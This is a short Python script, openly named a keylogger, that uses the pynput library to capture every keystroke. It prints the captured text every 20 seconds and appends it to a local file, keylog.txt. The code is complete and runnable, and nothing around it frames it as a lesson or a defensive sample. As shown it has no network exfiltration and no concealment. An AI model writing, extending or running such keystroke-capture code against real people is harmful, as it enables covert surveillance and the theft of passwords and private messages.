import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time_interval):
        self.log = "Monitoring started"
        self.interval = time_interval

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                current_key = " "
            elif key == pynput.keyboard.Key.backspace:
                self.log = self.log[:-1]  # Remove the last character from the log
                return
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(str(current_key))

    def report(self):
        print(self.log)
        self.save_to_file("keylog.txt", self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_to_file(self, filename, content):
        with open(filename, "a") as file:
            file.write(content)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

keylogger = Keylogger(20)
keylogger.start()